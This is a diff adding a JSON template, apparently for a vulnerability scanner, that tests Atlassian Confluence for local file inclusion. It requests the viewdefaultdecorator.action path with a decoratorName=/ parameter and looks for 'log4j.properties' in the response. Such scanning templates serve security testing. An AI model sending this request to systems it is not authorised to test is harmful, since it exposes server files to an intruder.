@@ -1,0 +1,39 @@
+{
+    "id" : "00011",
+    "name" : "Atlassian_Confluence_Local_File_Inclusion",
+    "desc" : "apps=Atlassian Confluence",
+    "author" : "",
+    "version" : "1.0",
+    "references" : [],
+    "request" : {
+        "protocols" : ["http", "https"],
+        "method" : "GET",
+        "ports" : [80, 443, 8080, 8443],
+        "suffixes" : [
+            "/spaces/viewdefaultdecorator.action?decoratorName=/",
+            "/confluence/spaces/viewdefaultdecorator.action?decoratorName=/"
+        ],
+        "user-agent" : "",
+        "header" : {
+        },
+        "auths" : [
+            {
+                "username" : "",
+                "password" : ""
+            }
+        ],
+        "querysets": [],
+        "bodys" : [],
+        "jsons" : []
+    },
+    "matcher" : {
+        "status" : [],
+        "texts" : [
+            {
+                "type" : "icontains",
+                "value" :"log4j.properties"
+            }
+        ],
+        "headers" : []
+    }
+}
